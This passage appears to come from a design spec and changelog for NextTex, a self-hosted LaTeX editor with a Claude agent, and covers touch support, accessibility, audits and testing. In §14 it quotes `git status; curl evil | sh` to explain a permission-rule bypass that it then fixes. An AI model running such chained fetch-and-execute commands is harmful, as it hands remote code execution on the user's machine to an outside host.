asks before it acts, and printing that on every card is how people learn to stop reading
them. The same
change made the rules from *Allow always* visible too — those were previously allowed in
silence, which was the same hole, unnoticed.

**Fonts are self-hosted, not loaded from Google Fonts.** §3 says "Google Fonts
only". NextTex is a self-hosted tool that people run on a private tailnet, and
often on a machine with no route to the public internet; a stylesheet from
`fonts.googleapis.com` would make the app's typography depend on Google being
reachable, and would tell Google every time someone opened their thesis. The
three families ship as `@fontsource` packages in the bundle. The typefaces and
their roles are unchanged.

**Proposed: what this specification would have to say to support touch, and
what it costs.** Written and not built, deliberately. The interface review
found that touch is not partially supported here, it is absent, and the
difference matters: a partial answer can be improved in place, and an absent
one is a decision about who the app is for. That decision belongs in this
document before any of it is coded.

What is actually there today, measured rather than estimated. **Zero** touch
handlers in the entire source. Three files handle `pointerdown`, all of them
for dragging a pane divider, and a pointer event from a finger arrives without
the hover that the affordance around it assumes. The smallest interactive
targets are 22 by 26 pixels, against the 44 by 44 that both platform
guidelines ask for. The preview's zoom is a `wheel` event with `ctrlKey` set,
which is a trackpad pinch and a mouse wheel and nothing a finger can produce.
The breakpoints above go down to 900 px and stop; below that the layout does
not reflow, it overflows, and there is no scroll fallback, so the right-hand
edge is simply unreachable.

The proposal, in the order the work would have to happen.

First, a stated minimum. This app is a two-pane editor with a third pane for
an agent, and there is a width below which that is not a layout, it is a
concession. Say 720 px, and below it give the shell a horizontal scroll rather
than a clip, so a narrow window is awkward and not broken. That is a small
change and it is the one that stops the current silent failure.

Second, hit targets, which is not a global size change. The rule would be that
anything a finger is expected to hit carries a 44 px touch area, through
padding or a pseudo-element, without the visual control growing. Applying it
everywhere would coarsen an interface whose density is the point; applying it
to the row menus, the tab close buttons and the preview controls is most of
the benefit.

Third, the gestures that have no keyboard or mouse equivalent. Pinch-to-zoom
in the preview is the only one, and it is `touchstart`/`touchmove` with two
points feeding the same zoom path the trackpad already uses.

Fourth, the pane dividers. A 3 px divider is a mouse target. On touch it needs
either a wider invisible grab area or, better, the folding controls that
already exist as the primary way to change the layout.

What is deliberately not proposed: a separate mobile layout, a phone-sized
breakpoint, or a rewrite of the shell. A tablet in landscape is the honest
target, because that is where a person edits a thesis and reads its proof.
A phone is not, and saying so is more useful than half-supporting one.

**Built, and four of the measurements above were wrong.** They are corrected
here rather than left, because the paragraph presents them as measured rather
than estimated, and a document that is wrong about its own numbers teaches the
next reader not to trust the rest.

There are no width media queries in the source CSS at all. The breakpoints are
JavaScript, in `layout.ts` now, and they are in shell units rather than
viewport pixels: the interface size is a `zoom`, so at 150 per cent a 1600
pixel window is a 1067 pixel shell and reaches them the way a much smaller
window would. Below 1400 the chat undocks, below 1100 the rail folds, below 900
the source and the preview take turns.

The smallest targets are not 22 by 26, which is the icon button size. The three
controls named above are smaller: the tab close button is 16 by 16, the file
tree row menu carries no size class at all inside a 16 pixel span, and the
preview zoom controls are about 13 by 16. Two of them are also `opacity-0`
until `group-hover`, which is a different and worse problem than being small:
on a device with no hover they are not hard to hit, they are invisible, and no
gesture reveals them. Those are gated on a `hoverable` variant now, so a mouse
sees them appear as before and a finger simply sees them.

The 44 pixel rule could not be applied flat. A file tree row is on a 22 pixel
pitch, so a 44 pixel tall invisible target centred on its menu would reach into
the rows above and below and take their taps, which is a worse bug than a small
control. The rule is therefore 44 on the axis with room and the row's own pitch
on the axis without it, through a pseudo-element, so no visible control changes
size and the density changes nowhere.

The clipping was at two layers, `body` and the shell, and the shell's is
deliberate: it clips with `overflow: clip` precisely so that nothing, including
a browser scrolling a focused element into view, can drag the window's frame
sideways. So the scroll fallback went outside it rather than into it. A shell
that cannot fit is wider than the frame around it and the frame scrolls, while
focus inside the shell still cannot scroll the shell. The minimum is a stated
number rather than `min-content`, which was tried and is wrong here: the
preview zooms to 300 per cent, and a zoomed page makes that pane's min-content
enormous, so the shell ballooned and the whole interface became horizontally
scrollable at high zoom. A pane that scrolls its own content must not be
allowed to set the width of the window it sits in.

The pinch feeds the zoom path the trackpad already uses, converted through one
tested function, so the limits, the frame coalescing, the redraw rationing and
the commit are all unchanged. One real difference is worth stating: a touch
gesture has an end event, and the settle delay exists only because a wheel does
not, so a pinch commits when the fingers lift rather than waiting out a timer
that is guessing.

The dividers were also mis-described. The vertical ones are a one pixel line
with a nine pixel invisible grab span, which is a comfortable mouse target and
a poor finger one, so it widens to twenty-four on a coarse pointer. Only the
diagnostics resizer was a bare three pixels, and it was a second copy of the
drag code that had never adopted the shared frame throttle. It uses the same
handle as the pane dividers now, with an axis.

The browser tier has a second project for this: a tablet-sized viewport with a
real touch pointer, running one spec. Not a spread of a device preset, because
those carry a WebKit browser type and this tier launches a pinned Chromium. All
three of its assertions were watched to fail against the interface as it was.

**Accepting an invite is a two-step answer, and the first step writes
nothing.** Joining used to sync the whole project, write every file, and
register it, and the first moment a person could look at what they had
accepted was after all of it was on their disk. Accepting an invite is
downloading somebody else's files, and vetting them is not an unreasonable
thing to want to do first.

So the join stops with the documents in memory and the connection held open,
and answers with the manifest: every path, its kind and its size. Accept
writes them and registers the project. Discard closes the connection and
removes the folder, which really does leave nothing behind rather than
deleting something written a moment earlier.

A file the build would run is listed as offered and marked as one that will
not be written, rather than being quietly left out. What somebody tried to
send is the more interesting of the two facts.

The connection cannot be held indefinitely: an unanswered join is discarded
after ten minutes by the same reaper that evicts idle sessions, and every
pending one is released when the server stops. A tab closed on the question
must not hold a peer connection open for the life of the process.

**A dialog keeps Tab, and gives focus back when it closes.** There was no Tab
handler anywhere in the source, so seven of the nine dialogs let Tab walk out
into the page behind them while they were still covering it, and dismissing one
left focus on `document.body`: the next Tab started from the top of the app
rather than from the control that had opened the dialog.

Both live in `useDismiss`, which every dialog already uses to close, so no
dialog had to ask for them. The trap is keyed on `role="dialog"` and nothing
else. A menu or a popover is not modal, and taking Tab away from the page
behind one would be a worse answer than the page behind it receiving Tab.

A dialog that opens with nothing focusable inside it still takes the caret,
through a `tabindex` of -1 on the panel, because otherwise the next key press
goes to the editor underneath.

Focus is given back on the way out, but only when nobody else has claimed it.
Restoring unconditionally is wrong and the browser tier said so: the file
tree's Rename item closes its menu and an inline input takes the caret in the
same gesture, so putting the caret back took it straight off again and the new
name was typed into nothing.

The one dialog this does not reach is the tutorial overlay, which does not use
the hook.

**There is a stack of transient messages, at the bottom of the shell.** §6 says
"no toasts". It carries save and download failures only — the cases where an
action the user took did not happen and nothing else on screen would say so. It
has no timer: a message stays until dismissed, because a failed save that fades
out is worse than no message at all.

A stack rather than one message, because for a long time it was one string and
thirty places wrote to it, so a second failure erased the first without a word:
two files refused in one drop, one message on screen. Each message has an
identity and its own dismiss control, and two identical messages in a row are
one event to somebody reading them.

The container is a `role="status"` live region and it is always in the
document, empty or not. A live region that appears at the same moment as its
content is not announced by every screen reader, and announcing these is the
whole purpose: they are the only report that something a person asked for did
not happen. `polite` rather than `assertive`, because none of them interrupts
what the writer is doing.

**Editor syntax highlighting is near-monochrome, and colour is opt-in.** The
specification does not cover token colours. By default — and this default is
unchanged — commands take `--ink` at 600, comments `--ink-3` italic, arguments
and literals `--ink-2`, and no hue is introduced: the rendered page sits two
panes away and must stay the loudest object on screen.

A per-machine setting (Settings → Highlighting → Colour) gives five families of
control sequence a hue each: sectioning, environments, mathematics, citations
and references, and the preamble. It exists because a chapter of LaTeX is far
easier to skim for its equations and its headings than for its words, and in one
ink it cannot be skimmed for either. Three things keep it from costing what §8
was protecting:

- It is off unless asked for, and off means off: every rule is gated behind
  a single class, so with the setting unset the decoration classes match no
  CSS whatsoever and the editor renders byte-identically to one built before
  the feature existed. The first version instead set each family to an ink,
  which requires knowing exactly what the LaTeX mode does to every token —
  and it does not do one thing. `\begin`, `\cite` and `\label` are `stex`
  plugins whose braced argument is an `atom` at `--ink-2`; `\section` is not
  a plugin, so its heading is plain text at `--ink`. One rule for "the
  argument" dimmed every heading in the untouched mode.
- The five hues sit at one lightness and one chroma ceiling per palette, so
  they read as one family rather than as a rainbow, and each is defined in
  both `.nx-theme-light` and `.nx-theme-dark` — the editor's own theme carries
  them, so a white page in a dark shell gets the light palette's colours.
  `contrast.test.ts` certifies every one against `--surface` in both.
- None of them is violet. `--pen` means the agent touched this line and is the
  one accent that appears near the text itself; the test asserts 35° of hue
  clearance from it, so a heading can never be mistaken for an edit. The other
  four accents appear inside the editor only as gutter bars, dotted underlines
  and washes — never as the colour of text — so the syntax hues share a
  channel with none of them.

The families are decided by command name in `latex-families.ts` and applied as
a `ViewPlugin` decoration, not as a `HighlightStyle`: the `stex` mode reports
every control sequence as one token, so a style keyed on token types cannot
tell `\section` from `\cite` however many colours it is given. Inline `$...$`
is decorated too, since it is the one form of mathematics that carries no
command to key on. Names outside the five lists take the ordinary command
styling rather than a guessed family.

**Spell checking, off by default.** The specification does not mention it.
CodeMirror sets `spellcheck="false"` on its content and is right to: a LaTeX
file is mostly not English, and the browser's own checker underlines every
package name, citation key, label and environment. A checker that marks
those teaches the writer to ignore every mark it makes, which is worse than
having none.

So the work is in deciding what is prose. `spell-scan.ts` subtracts rather
than adds, and the set it subtracts is: comments; control sequences
themselves; inline and displayed mathematics; optional arguments, which are
always keys, lengths or placements; the braced argument of every command
whose argument is a name rather than a sentence; `\verb` and whatever
delimiter it chose; and everything inside an environment that is not prose
at all — the maths environments, `verbatim`, `lstlisting`, `minted`,
`tikzpicture` — which is tracked across lines, because an `\end{align}` may
be a long way below its `\begin` and a per-line scan cannot see that. What
is left is checked. Words shorter than three letters and words in full
capitals are passed over as well: an acronym is spelled by its initials and
no list holds it. The distinction that matters is
not which family a command belongs to: `\section{...}` and `\caption{...}`
take prose and are checked, because a typo in a heading is the one a writer
most wants caught, while `\begin{...}` and `\label{...}` never do.

Three constraints shaped the rest:

- **Nothing ships until it is asked for.** The checker sits in a
  `Compartment` that is empty until the setting is turned on, so neither it
  nor its word list is in the interface bundle. The list is 98 kB brotli'd
  and is fetched once, on first use. `bundle.initial_kb` still rose about
  four kilobytes for the switch and the editor's side of it, and the budget
  was raised deliberately rather than quietly — see `bench/thresholds.json`,
  which now says why.
- **The writer's own words are the feature.** A dissertation is full of
  terms no list holds, so a right-click on an underlined word accepts it
  permanently, into `.nexttex/dictionary.txt` — machine-local and
  uncommitted, like every other piece of per-project state here, and plain
  text so two hundred species names are a paste rather than two hundred
  clicks.
- **It is not a diagnostic.** A dotted underline in `--ink-3`, no gutter bar
  and nothing in the diagnostics drawer. Red and amber mean the build is
  wrong; three hundred spellings in that drawer would bury the two compile
  errors that matter.

There are no suggested corrections. Ranking candidate spellings is a real
algorithm and a real interface, and neither is what was asked for.

**The status strip adapts to its own width by dropping segments.** §5 requires
that the strip never reflow. The editor pane is resizable down to 420 px, where
all six segments cannot fit on one line. Rather than wrap, segments drop out in
reverse order of value — the file path first, since the tab above already names
it, then the preview scope — through container queries on the strip itself.
Every remaining segment keeps its reserved width, so nothing shifts as digits
change.

**A `Hide` control on the slide-over.** §4 describes the Claude panel becoming a
slide-over below 1400 px but not how it is dismissed; without one it covers the
PDF permanently. Below that width the tab bar carries a `Claude` button and the
panel a `Hide` link, and the panel animates on `translateX` at 180 ms as
specified.


## 9. Revision two

The first implementation was reviewed against sections 1–8 and the findings
acted on. What follows is what the design gained afterwards, at the writer's
direction: *"add a splash of colour and subtle animations where necessary to
give hints to the user… tune the colour palette towards the darker side… give
the user two options, one light and one dark… all panels should be resizable
and collapsible… the user should be able to see their usage stats and change
the model on the agent panel… all projects start blank."*

**A second accent, `--hint`, with one job.** `--pen` still means *Claude
touched this* and nothing else. `--hint` is for live and interactive state that
is not the agent: the `Stop` control while a turn is running, a control the eye
is meant to find. It is a desaturated teal at roughly 185°, a hundred degrees
from the pen, so the two never read as the same signal.

**Motion is a hint, never decoration.** Four primitives, all inside the 0/90/
120/180 ms budget: `.nx-hover` (90 ms colour on interactive rows), `.nx-press`
(a 1 px depress on click, so a button feels answered), `.nx-pane` (180 ms width
change when a panel folds, so it is clear where it went), and `.nx-arrive`
(120 ms, 3 px rise, for something that appeared because you asked for it —
the usage panel, the welcome message). `prefers-reduced-motion` reduces all of
them to an opacity change.

**Every panel folds, and says where it went.** The file list, the source, the
preview and the Claude column each have a fold control; a folded panel leaves a
26 px strip carrying its name vertically, which is both the evidence that it is
folded and the control that brings it back. Source and preview are mutually
exclusive — folding one gives the other the whole middle, and folding both
would leave nothing to work in. Fold state is remembered per project.

**The preview reads two ways.** A `Scroll` / `Page` toggle in the PDF bar. The
scrolling view is the default and is built for rebuilds: page elements and
their canvases are *reused* when a rebuild produces the same page count and
geometry, so a recompile redraws only the pages actually on screen instead of
recreating the document. Scroll handling is coalesced to one pass per animation
frame, and a canvas keeps its previous render until the new one is ready, so
the pane never blanks. Page mode keeps a single page in the flow and answers
the arrow keys.

**The agent column carries its own instruments.** A model selector (default,
Opus, Sonnet, Haiku) that takes effect on the next question — the conversation
resumes by session id, so changing model does not lose the transcript — and a
usage readout: turns, estimated cost, tokens sent, written and read from cache,
and model time, counted per project and kept across restarts. Cost is labelled
as an estimate, because on a subscription it is not a bill.

**New projects are blank.** One empty document, an empty bibliography, a
figures folder. A journal class, a university handbook and a lab report agree
on nothing, so NextTex does not guess: the way to shape a project is to upload
the real template and let the agent read it.

**The agent speaks first.** A project with no conversation shows a message from
Claude — written into the app, not generated — covering the three panes, what
the agent can and cannot do without asking, how to tailor the project with a
template, and how to teach it the writer's voice. It is the app's only
onboarding, and it is set as the agent's own prose because the agent is what
does all of it.


## 10. What the second audit changed

The built interface was audited as a whole — visual design, information
design, interaction, wording, accessibility — against §§1–9 and against real
renders in both themes. The audit's own summary is that four things carried
most of the damage; all four are fixed, along with most of the smaller
findings.

**The transcript is now durable, and that is architecture, not polish.** The
model resumes its own memory of a conversation from disk, so a panel that
started empty meant the agent could refer to work the writer could not see.
More importantly, §5 promises that the chat is a record of what was done to
the document — every diff, every reverted edit, every command allowed or
refused — and a record that survives one session is not a record. Events are
now written to `.nexttex/transcript.jsonl` as they are broadcast, with
streamed text coalesced into whole messages, and replayed when the project is
reopened. A permission still unanswered when the window closed replays as
denied, because the turn that was waiting on it is gone.

**Folding the file list no longer strands anything.** The project name, the
switcher, the theme toggle and the downloads move into whichever header is
still on screen — the tab bar, or the preview header when the source is
folded too.

**The surfaces have their specified separation.** The steps had been built at
roughly half the distance the palette called for, and `--line` sat at 1.5:1,
so panes had no visible edges, drag handles were invisible, and a selected
segment was indistinguishable from an unselected one. The steps are now 5–7
L\* apart in both themes and `--line` clears 3:1. `--ink-3` was below 4.5:1 on
`--surface-2` — the surface most of the app's metadata actually sits on — and
is now 5.2:1 in both.

**Green means the preview is current.** §5 says a clean build renders in no
colour at all, and §7 argues that a green tick firing on every debounced
rebuild becomes noise within an hour. That argument is about a *success
flash*; the dot is a *resting state*, and the two are different objects.
Green here does not fire — it sits, for hours, and says the picture beside
the text is the text. What fires is the departure from it: the dot goes
`--warn` on the first keystroke after a build and stays there until the next
one lands. Colour now answers one question, does the preview match the
source, and the label beside it answers the other, which is what the last
build had to say. `--ok` therefore carries a fourth job beyond git, diffs and
resolved permissions.

**Warnings no longer colour the dot.** §5 gave `--warn` to chktex counts. It
now means the preview is behind, in both the stale and the compiling states.
A document with warnings and a current preview shows a green dot and the
label `2 warnings`, which is accurate on both counts: nothing is out of date,
and there are two things to read if you want them. Warnings keep their
`--warn` severity bar in the diagnostics drawer, and their gutter bar in the
editor when the writer has that switched on.

**The compiling dot breathes, and it is the only animation in the app that
repeats without being asked.** §6 lists every status strip dot change under
*does not animate*, and §7 says there are no spinners anywhere. Both stand,
with one exception written down here: a build that has already run for 400 ms
is the one case where the strip has to say *still working* rather than *this
is the state*, and the 2 px hairline that used to say it swept the full width
of the strip, in the corner of the eye, for as long as the build took. The
dot breathes instead — opacity 1 → 0.32 over 700 ms, alternating, on the
app's single curve — on the same 400 ms threshold the hairline used, so a
130 ms build still shows nothing at all. Under `prefers-reduced-motion` it
becomes a hollow `--warn` ring, the same disc-versus-ring distinction the
idle dot already uses, for the same reason the hairline became a static bar.
The sweeping hairline itself survives, on the one operation that genuinely
takes minutes: installing an update.

**The underline points at a token, or there is no underline.** §4 already
says the gutter carries the news and the writer comes to the detail. A dotted
rule under a whole line of LaTeX was not pointing at anything the gutter bar
had not already said, and it was drawn through text somebody was trying to
read. It now covers the token at the column the tool reported, and where
there is no usable column — every compile error, since the LaTeX log has none
— the gutter bar is the whole in-text signal.

**Two drifts, recorded rather than fixed.** `--line` composites to about
2.4:1 in light and 2.6:1 in dark against the surfaces it sits on; the note
below claiming it "clears 3:1" has not been true since the mix was set at
55%. Raising it to about 68% would make the claim true and visibly thicken
every border in the app, which is a separate decision from this one. And this
table's `--pen` values had drifted from the stylesheet's twice before this
revision, which is why the contrast test now parses the palette out of
`styles.css` rather than trusting anything written here.

**`--pen` is back to meaning one thing.** It had spread to eight filled
buttons, of which five had nothing to do with the agent; the loudest object in
the light theme was a GitHub setup button. Filled violet is now `Allow` and
`Send` only — answering the agent, or addressing it. Everything else is a
ghost button that takes `--hint` on hover, which is also now on the drag
handles, the segmented controls, the chip actions and the fold controls: the
jobs the second accent was invented for.

Also: the welcome message is three paragraphs with its two instructions as
buttons that do the thing, rather than five paragraphs of prose pointing at a
grey row; the usage panel leads with one number instead of a 2×3 grid in four
units; the edit chip shows `Show` and `Undo` without waiting for a hover, and
no longer sits under a tool row saying the same thing; the permission card has
a `--warn` focus ring, because a card that answers bare keypresses must show
that it has focus; the file tree is one tab stop with arrow-key navigation
rather than forty; diagnostics say "2 errors, 1 warning" instead of "3
findings", which also stops severity being carried by colour alone; the
preview can fit a whole page; and reduced motion now makes the compile
indicator and the SyncTeX highlight *static* rather than fast, which was the
point of both.


## 11. Where the writing instructions live

Two things shape the prose the agent produces, and they are deliberately kept
apart.

The **system prompt** carries a long section on writing that does not read as
machine-written: lead with the claim, prefer the specific number to the
careful phrase, vary sentence length and opening, put a real subject early,
and stop rather than restating the paragraph's first sentence in different
words. It also names the tells outright — *delve*, *underscore*, *robust*,
*It is important to note*, *plays a crucial role in*, stacked
*Moreover/Furthermore*, paired near-synonyms — because a general instruction
to write naturally does not survive contact with a first draft. It is
explicit that swapping a banned word for a synonym fixes nothing.

The **voice description**, when the writer has uploaded samples of their own
work, outranks all of that. It is distilled once into eight headed sections —
sentence length ranges, paragraph shape, person, the exact hedging words,
connectives, characteristic vocabulary, how terms and citations are
introduced, and what the author never does — and the prompt says plainly that
where the two disagree the author wins, including where the author does
something the general guidance discourages. A document is supposed to sound
like its author, not like a house style. The precedence note is added to the
prompt only when a voice summary exists, so nobody pays for it who has not
uploaded a sample.


## 12. Version history, a trash, and completion

Added at the writer's request, after the second audit. Three of these are
new surfaces; the rest are corrections to old ones.

**History is browsed inside the editor.** A 264 px panel overlays the right
edge of the editor pane — an overlay rather than a fourth column, so opening
history does not reflow the preview and lose the reader's place in the PDF.
Versions are grouped by day, because "some time on Tuesday" is how people
remember losing a paragraph, and each row carries the time, who made it, the
reason or the label, and the size. Selecting one puts the editor into a
read-only viewing mode with a 26 px banner at the top of the pane, inside the
editor rather than floating over it.

The one unacceptable failure in this feature is autosaving historical text
over the live file, and it is closed three independent ways: the historical
text is loaded into a state built from a *different extension set with no
update listener at all*, so no dispatch of any kind can arm a save;
`EditorState.readOnly` and `EditorView.editable` are the second and third
locks; and the live `EditorState` is never touched, which is also why undo
history and cursor come back intact rather than being saved and restored.

**Show changes** shades lines that are in the old version and not in the file
as it stands, using `--error` at 12 % with a 2 px inset bar. Error red rather
than a neutral wash on purpose: what you deleted is what you came looking
for.

**The trash is a section under the file tree**, appearing only when it holds
something. Deleting asks nothing — the file moves to the trash with its
history and the count goes up — because a confirmation before an action that
is one click from being undone is friction for nothing. Deleting *from* the
trash asks, in the app's own type, because that one is final.

**Autocomplete belongs to the project, not to LaTeX.** Citation keys carry
their author and year; labels carry the file they are defined in; the
writer's own `\newcommand` macros are offered before the built-in list and
marked `yours`. The popup is themed to the app — `--surface` on `--line`,
the selected row on `--hint-wash` — so it does not read as a stock editor
widget dropped into a designed application.

**Equation previews** render with KaTeX on hover, lazily imported so nobody
who never writes maths pays 260 KB for it, with the project's own macros
passed through as KaTeX macros. `\npistar` renders as the notation it stands
for rather than as an error.

**The mark.** A sheet of paper with its corner turned, notched on the left so
the negative space reads as a chevron — next. Hectograph violet on the tile,
paper white inside, drawn on a 32-unit grid and checked at 16 px. It is
inlined into the HTML as a `data:` favicon rather than served as a file,
because the server routes every unknown path to the app shell and a
`/logo.svg` would come back as HTML.


## 13. What the third audit changed

The new surfaces were audited against §§1–12 with real renders in both
themes. What it found, and what was done:

**The history panel now docks rather than overlays**, whenever the editor is
wider than 700 px. As an overlay it covered the right third of every wrapped
LaTeX line, so the file could not be read while the panel comparing it to its
past was open — which defeats the panel. Below that width it still overlays,
now on `--surface-2` so the plane change is legible without depending on a
hairline. It also keeps your place: entering a version anchors to the line
you were on rather than resetting to the top, because the old version is a
different length and a pixel offset would land somewhere else entirely.

**The banner is unmistakably not the tab bar.** It had been `--surface-2` —
the tab bar's own fill, directly above it — announcing the most consequential
state in the editor in the same colour as more toolbar. It now takes a
`--hint` top rule and a tinted fill, `--pen-wash` when the version is
Claude's. Escape leaves. Every path that closes the panel also leaves viewing
mode, which the status strip's toggle did not, and `Restore this` — the only
mutating action available in a read-only mode — confirms in place like every
other destructive action in the app.

**"Show what's gone" is a real diff.** It had been set membership: does this
line appear anywhere in the new text. LaTeX is full of repeated lines, so
deleting a figure block left `\centering` and `\end{figure}` unshaded and the
eye got a comb where it needed a block. It is now an LCS diff, and the label
says what it actually shows — the old version's deletions, since additions
since are invisible by construction. The 2 px error-coloured gutter bar is
gone: it was the same shape, colour and position as a diagnostic marker.

**One stray `$` no longer breaks every equation preview after it.** Dollar
pairing ran over the whole document, so a single unclosed delimiter — the
commonest LaTeX typo there is — inverted the pairing for everything below it:
hovering prose rendered maths, hovering maths rendered nothing. The scan is
now scoped to the paragraph under the pointer and says nothing when that
block is unbalanced, which is also what makes it cheap enough to run on every
pointer move.

**`.quiet` was silently repainting other elements' colours.** It is unlayered
and outweighs Tailwind's utilities, so `quiet … hover:text-error` on the
trash's Delete hovered to `--hint` — the colour that means *safe and
interactive* — and the preview's selected Fit width state was identical to
the unselected one. Tone is now carried by a `data-tone` attribute the class
respects.

**Smaller, all from the same pass:** one `--float` shadow token replaces three
hand-rolled recipes; the `main` tag lost its `--surface-3` chip, which was
under 4.5:1 in both themes and wore the pressed-state colour for a permanent
label; the trash reads like the file tree it hangs under, with 26 px rows,
stem/extension names and the same clock the history panel uses; `Create
project` is a ghost button, since the projects screen has no agent on it and
filled violet was the loudest thing on the page; the completion popup is
capped so it stops crossing into the preview; and the logo was redrawn with
one chevron instead of two two units apart, on an outlined tile — the old
mark fused into a violet smudge at 18 px, and a brand mark should not spend
the fill that means *answer the agent*.

## 14. Building the instruments, and what they found

The three audits above were done by reading code and looking at screenshots.
That is how every bug in them was found, and it is also why this section
exists: fourteen thousand lines of source were covered by nine hundred lines
of test, all of them unit tests over `nexttex/`. **Not one HTTP route was
tested, no frontend code was tested at all, and every browser check had been
a throwaway script in `/tmp`.**

Writing the plan proved the cost. Reading the app against a coverage map
turned up three bugs that broke a feature outright — changing the model
raised a 500, the sign-in screen never advanced after a successful login,
and the Console/SSO button was wired to a parameter the server does not
read. None would have survived a suite. Adversarial reading of the same code
found a dozen more, and the suite itself found several the reading missed.

### What was built

**A scripted agent.** `ProjectAgent` spawns the real `claude` CLI: slow,
costly, non-deterministic, and it needs an account. So a large part of the
app — streamed prose, edit chips with their diffs and undo, permission cards
and their shield, the follow-up queue, usage, model switching — was
untestable. `nexttex/scripted_agent.py` replays a list of steps from
`tests/scripts/*.json` through the same event queue the real one writes to.
An `edit` step performs a real write, so the version, the rebuild, the chip
and the undo all run for real; a `permission` step really does block until
somebody answers. A browser test names the script in the first line of its
question: `#script:permission`.

It has one honest limitation, and it is the one the earlier reviewer warned
about: a stand-in cannot tell you whether the real SDK still emits the
message shapes the scripts assume. That is what the `NEXTTEX_LIVE` smoke
test is for, and it is run by hand.

**API contract tests.** Every route, its documented failures, and a path
escape assertion on everything that takes one. The fixture ordering is
load-bearing: `server/main.py` builds `SETTINGS` and `REGISTRY` at *import*
time and `Settings.load()` writes a config file when it finds none, so the
environment is redirected at conftest module scope, before anything under
`server` is imported. Otherwise running the tests hands a different token to
whatever tab is open.

**A browser tier.** Each spec starts a NextTex of its own — own port, own
XDG directories, own projects, a config written before the server so the
token is known rather than scraped from a log line — and drives it against
the Chromium actually cached on the machine rather than the build number the
library expects. Every wait is on an observable: a response, a DOM state,
never a clock. The exception is written down: one spec has to prove a build
*does not* happen while an equation is unbalanced, and a negative assertion
needs a clock.

That spec is worth a paragraph, because two versions of it passed while
testing nothing. The first counted `/compile` requests -- but an ordinary
save carries `compile: true` in its own body, so the server starts the build
itself and no such request is ever made; the count stayed at zero whatever
the app did. The second watched the status dot, which does say "Compiling"
-- for the 130 milliseconds a build of a short document takes, which a poll
cannot be relied on to catch. Both passed with the debounce deliberately
disabled. The third subscribes to the event stream from the test process and
counts `compile_start`, which is the thing actually being asserted, and it
fails when the debounce is removed. The same helper is there for any spec
that needs to assert on something the page never displays.

The same rewrite turned up why the second version could not have worked
either: it clicked the editor and typed, which lands wherever the viewport
happens to be -- the preamble. `mid_construct` looks only between
`\begin{document}` and `\end{document}`, on purpose, so an unbalanced `$`
typed into the preamble is not unfinished work and never was. The spec now
puts the cursor in the body deliberately.

**A sign-in that is driven end to end.** The bug on that screen -- waiting
for an `exit` event that nothing published -- lived in the seam between a
real interactive program under a pseudo-terminal and a browser waiting on
its output. Both halves were individually correct, and a mock of either
would have had no seam to get wrong. So `tests/fake_claude.py` is a real
program, run under the real pseudo-terminal, through the real pump: it
prints a verification URL without a trailing newline the way the CLI does,
waits for a code on stdin, and reports itself signed in afterwards. The
server finds it through `NEXTTEX_CLAUDE_BINARY`, which is the whole of the
production change. Two tests then cover the flow, one over the API and one
in a browser, and both fail if the event is renamed on either side.

**Property tests** over the two places where being right for the cases
somebody thought of is not enough: the path fence, and what retention is
allowed to throw away.

**A hostile-input layer.** None of it is an attack. It is a figure with a
per cent sign in its name, a chapter pasted from Word, a project of two
thousand files, a directory that went read-only because something was
syncing it, a disk that filled up.

**Benchmarks**, on demand, against a project shaped like a thesis: forty
source files, two megabytes of LaTeX, a populated build directory, a `.git`
with a working tree. The thresholds are budgets, not records.

### The bugs that mattered

**Two windows on one project destroyed each other's work.** `PUT /file` was
whole-file last-writer-wins with nothing watching, and the watcher's own
"this was us" suppression meant the second tab was never even told a save
had happened — so its autosave wrote a stale buffer over everything the
first had written, silently, with the tab still showing clean. A save now
carries a tag for what the browser last agreed the file said, is refused
rather than believed when the file has moved on, and is broadcast to every
other tab. The refusal is a banner offering both copies.

That tag was got wrong twice before it was right. A float second was far too
coarse — saves land a quarter of a second apart, and any slack wide enough
to absorb filesystem differences was wide enough to wave the clobber
through. `st_mtime_ns` was better and still wrong: it is only as fine as the
filesystem chooses to record, and two writes a millisecond apart share one
on plenty of them. The test caught that by failing one run in three. It is a
hash of the contents now, which answers the real question anyway.

Closing the loop found one more: history collapses an editing burst into a
single version, and both windows are "you", so the tab that saved second
replaced the other tab's version and the text it had overwritten was gone
from the history as well as from the file. A burst now only collapses within
the window that made it.

**A server restart killed every open tab, silently.** Forty-two routes
required a project to be open, including the event stream — so after a
restart the browser retried a 404 every two seconds forever with nothing on
screen saying so. "Open" is what a user does to a window, not a
precondition the server keeps: `session_for` opens a registered project on
demand, and only the open route marks one as recently opened.

**The preview zooms with the wheel and with a pinch.** Ctrl with the wheel,
or two fingers on a trackpad, which every browser reports as a wheel event
with `ctrlKey` set. Two things make it more than ten lines. The listener has
to be a native, non-passive one: React registers `wheel` passively on its
root, so `preventDefault` inside `onWheel` is ignored and the browser zooms
the whole application instead of the document. And a gesture must not
relayout the document sixty times a second — each page is a canvas sized by
its container, so the handler resizes the containers, which rescales what is
already drawn at the right scroll extents, and the crisp redraw runs once,
140 ms after the gesture stops. The point under the pointer stays under the
pointer, and the range is the one the zoom buttons already offered.

**A file created through the API never appeared in the tree.** A save
broadcasts `structural: False` so that a keystroke burst in one window does
not cost every other window a full tree request. Creating a file went
through the same line, so the new name was not in any open tab's tree until
somebody reloaded the page -- the file existed, was being edited, and could
not be reached. The broadcast now says structural when the file was not
there before. Found by a browser spec written for something else entirely,
which is the argument for the tier.

**A reload lost your place.** Not a bug, and it read as one. NextTex now
comes back to the document with the same files open and the same one in
front, and leaving for the project list is remembered just as deliberately.

**Ctrl-F did nothing** — on the first press. `searchKeymap` was bound
without the `search()` extension that provides the panel, and CodeMirror
installs the missing field in the same transaction that asks to show it, so
the field never sees the effect. The second press worked. A LaTeX editor
with no find and replace, one line away from having it.

**"Always allow" was wider than it looked.** The rule was scoped to a Bash
command's first word, which is only honest for a command that has one:
`git status; curl evil | sh` starts with `git`, so `Bash:git` covered it for
good. A command carrying shell syntax now gets no rule at all, is asked
about every time, and the card does not offer to remember it.

**The compile was doing work three times over.** Every build fired
`/symbols`, `/words` and `/git` — a full project rescan, a `texcount`
subprocess and a `git status` — inline on the single event loop, every 1.6
seconds while somebody typed. During those, the server answered nothing at
all: no autosave, no streamed token, no PDF. The symbol cache was worse than
slow: its stamp walk counted `.pdf` files and skipped only `.git` and
`.nexttex`, so `build/main.pdf` moved the stamp on every compile and the
whole project was rescanned every time. The benchmark keeps a guard on
exactly that: if it comes back, `symbols.after_build_ms` goes from about one
millisecond to about twenty.

**Secondary text on the third surface was unreadable** — 4.22:1 in the light
theme and 4.33:1 in the dark, against a 4.5:1 requirement. This has now been
got wrong twice and caught by eye both times, which is not a method. The
palette is parsed out of `styles.css` and every pairing the app uses is
